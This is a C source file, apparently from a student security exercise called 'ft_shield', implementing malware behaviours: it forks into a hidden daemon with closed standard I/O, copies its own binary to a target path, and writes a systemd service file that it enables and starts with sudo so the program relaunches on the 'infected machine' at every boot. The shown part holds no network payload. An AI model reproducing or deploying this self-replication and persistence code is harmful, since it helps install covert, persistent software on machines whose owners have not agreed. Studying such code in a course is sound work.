#include "../includes/ft_shield.h"
#include <stdlib.h>

void signals_handler() {
    exit_properly(EXIT_FAILURE);
}

void auto_start_persistance() {
    int fd;

    // persistance already exist
    if (access(SERVICE_FILE_PATH, F_OK) != -1)
        return ;

    // create new service file
    if ((fd = open(SERVICE_FILE_PATH, O_CREAT|O_WRONLY|O_TRUNC, 0644)) < 0)
        exit_properly(EXIT_FAILURE);
    
    // write content of service file
    if (write(fd, SERVICE_FILE, strlen(SERVICE_FILE)) < 0) {
        close(fd);
        exit_properly(EXIT_FAILURE);
    }

     if (close(fd) < 0)
        exit_properly(EXIT_FAILURE);

    // change file rights
    chmod(SERVICE_FILE_PATH, 0755);

    // daemon reload
    system("sudo systemctl daemon-reload");
    // service activation
    system("sudo systemctl enable ft_shield");
    // service start
    system("sudo systemctl start ft_shield");
}

void auto_replicate() {
    int in_fd;
    int out_fd;
    ssize_t len;
    ssize_t bytes_read;
    ssize_t bytes_written;
    char bin_path[BUFFER_SIZE];
    char buffer[BUFFER_SIZE];

    // copy file already exist
    if (access(TARGET_PATH, F_OK) != -1)
        return ;

    // get path of running program
    if ((len = readlink(PROC_SELF_EXE, bin_path, sizeof(bin_path)-1)) < 0)
        exit_properly(EXIT_FAILURE);
    
    bin_path[len] = '\0';

    // open binary file of running program
    if ((in_fd = open(bin_path, O_RDONLY)) < 0)
        exit_properly(EXIT_FAILURE);
    
    // create new file at target path
    if ((out_fd = open(TARGET_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0) {
        close(in_fd);
        return ;
    }

    // read input binary file 
    while((bytes_read = read(in_fd, buffer, sizeof(buffer))) > 0) {
        
        // write input binary file in output file
        bytes_written = write(out_fd, buffer, bytes_read);
        
        // check all bytes are written successfully
        if (bytes_written != bytes_read) {
            close(in_fd);
            close(out_fd);
            exit_properly(EXIT_FAILURE);
        }
    }

    if (bytes_read < 0 || close(in_fd) < 0 || close(out_fd) < 0)
        exit_properly(EXIT_FAILURE);
}

void daemonize_program() {
    pid_t pid; 

    pid = fork();
    if (pid < 0)
        exit(EXIT_FAILURE);
    else if (pid == 0) {
        // set default permissions (root) for files created by the process.
        umask((mode_t){0});

        // change the working directory to the root directory
        chdir("/");

        // create a new session and become the session leader
        setsid();

        // redirects standard I/O to /dev/null to avoid becoming the owner of a terminal
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        open("/dev/null", O_RDONLY);
        open("/dev/null", O_WRONLY);
        open("/dev/null", O_WRONLY);

        // installs signal handlers
        signal(SIGINT, signals_handler);
        signal(SIGTERM, signals_handler);
        signal(SIGQUIT, signals_handler);
        
        // duplicate the program on TARGET_PATH
        auto_replicate();

        // create service to launch the program when the infected machine is started automaticaly
        auto_start_persistance();

    }

    printf(STUDENT_LOGIN);
}